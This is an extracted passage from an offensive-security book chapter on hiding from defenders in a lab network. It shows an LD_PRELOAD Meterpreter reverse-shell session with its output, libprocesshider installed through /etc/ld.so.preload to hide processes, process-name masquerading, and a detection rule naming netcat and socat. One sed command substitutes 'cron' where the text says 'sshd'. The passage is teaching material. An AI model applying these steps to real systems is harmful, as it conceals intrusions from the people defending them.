@@ -1,0 +1,98 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 1 - $ LD_PRELOAD=/tmp/meterpreter.so ssh
+Listing 12-1: Using LD_PRELOAD to preload Meterpreter
+In Metasploit, you should see output similar to the following:
+[*] Started reverse TCP handler on 172.16.10.1:2222
+[*] Sending stage (3045348 bytes) to 172.16.10.13
+[*] Meterpreter session 1 opened (172.16.10.1:2222 -> 172.16.10.13:46048)
+Security Relevance Score: 3
+Word Count: 830
+Extracted: 2025-06-13 23:40:57
+
+---
+
+$ LD_PRELOAD=/tmp/meterpreter.so ssh
+Listing 12-1: Using LD_PRELOAD to preload Meterpreter
+In Metasploit, you should see output similar to the following:
+[*] Started reverse TCP handler on 172.16.10.1:2222
+[*] Sending stage (3045348 bytes) to 172.16.10.13
+[*] Meterpreter session 1 opened (172.16.10.1:2222 -> 172.16.10.13:46048)
+
+meterpreter >
+
+Now that you have a Meterpreter shell, run the help command to see the commands available to you.
+
+
+Process Hiding
+Another way to hide malicious processes is with libprocesshider, developed by Gianluca Borello. This tool also uses preloading to load custom shared libraries before other libraries are loaded. We’ll use libprocesshider to hide the process name from tools such as ps.
+On Kali, run the following commands to clone the GitHub repository:
+$ git clone https://github.com/gianlucaborello/libprocesshider
+$ cd libprocesshider
+
+Next, modify the processhider.c script to use the process name you want to hide (instead of the script’s default value of evil_script.py). In this case, we’ll replace it with sshd:
+$ sed -i s'/evil_script.py/cron/'g processhider.c
+Next, compile the script by using make:
+$ make
+This command should create a file named libprocesshider.so. Copy it to the p-jumpbox-01 machine (172.16.10.13). Next, add the libprocesshider.so filepath to the /etc/ld.so.preload file on p-jumpbox-01 using the root user. The changes should take effect immediately after you add this line:
+# echo /tmp/libprocesshider.so >> /etc/ld.so.preload
+Run ps again to see the result:
+# ps aux
+
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0   2752   972 ?        Ss   03:23   0:00 /bin/sh -c service ssh re...
+root          29  0.0  0.0   3760  2132 ?        Ss   03:23   0:00 /usr/sbin/cron -P
+root          30  0.0  0.0   2684   904 ?        S    03:23   0:00 tail -f /dev/null
+root          34  0.0  0.0   4524  3892 pts/0    Ss+  03:23   0:00 bash
+backup        68  0.0  0.0   4524  3836 pts/1    Ss   03:26   0:00 -bash
+backup       113  0.0  0.0   4524  3748 pts/2    Ss   03:38   0:00 -bash
+backup       116  100  0.1   8224  4064 pts/2    R+   03:38   0:00 ps aux
+
+As you can see, the sshd process is hidden from the output. It should also be hidden from other tools, such as top:
+# top -n 1
+
+Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie
+%Cpu(s):100.0 us,  0.0 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+MiB Mem :   3920.9 total,   1333.0 free,   1350.8 used,   1598.0 buff/cache
+MiB Swap:   1024.0 total,    681.3 free,    342.7 used.   2570.2 avail Mem
+
+    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
+      1 root      20   0    2752    972    868 S   0.0   0.0   0:00.02 sh
+     29 root      20   0    3760   2316   2080 S   0.0   0.1   0:00.00 cron
+     30 root      20   0    2684    904    800 S   0.0   0.0   0:00.12 tail
+     34 root      20   0    4524   3972   3296 S   0.0   0.1   0:00.19 bash
+     68 backup    20   0    4524   3836   3224 S   0.0   0.1   0:00.01 bash
+    153 root      20   0    8728   4728   2828 R   0.0   0.1   0:00.01 top
+
+However, this method isn’t foolproof, as the malicious process hasn’t disappeared completely. You can still find it under the /proc filesystem by specifying the PID in the filepath:
+# cat /proc/17/comm
+
+sshd
+
+To further conceal your processes, you could try masquerading them.
+
+
+Process Masquerading
+Process masquerading is a general term for techniques that adversaries use to mask a malicious process as legitimate. For instance, they may rename it to something that looks like a system process by using hard-to-spot typos, like corn, which may look like cron at first glance. Such renaming could evade endpoint security tools that use custom detection rules to look for the names of specific executing binaries. For example, consider the following pseudocode for an alert:
+alert if os_type == "Linux" AND process_name in("ping", "nping", "hping",
+"hping2", "hping3", "nc", "ncat", "netcat", "socat")
+
+This alert logic seeks to catch processes with names such as ping, netcat, and socat on any Linux operating system.
+The problem with binary name–based detection rules is that binary names can be changed, so they’re easier to evade than behavior-based detections or more intelligent heuristics. In the next exercise, you’ll hide a process by using evasive names.
+Exercise 27: Rotating Process Names
+In this exercise, you’ll run a process by using a random name so it blends in with the environment and becomes harder to spot. We’ll use a handful of possible process names surrounded by square brackets ([]), which usually indicate that the processes don’t have an associated command line like those in /proc/PID/cmdline. Kernel threads are an example of such processes.
+Listing 12-2 shows examples of process names with square brackets running on Kali. Use grep with a regular expression to extract this text.
+$ ps aux | grep -o '\[.*]' | head -8
+
+[kthreadd]
+[rcu_gp]
+[rcu_par_gp]
+[slub_flushwq]
+[netns]
+[mm_percpu_wq]
+[rcu_tasks_kthread]
+[rcu_tasks_rude_kthread]
+
+Listing 12-2: Listing processes with square brackets
+By using square brackets, you can make your process look more legitimate and harder to catch, because defenders might assume it to be a normal system process and skip it when reviewing process lists.
+To get started, consider the script in Listing 12-
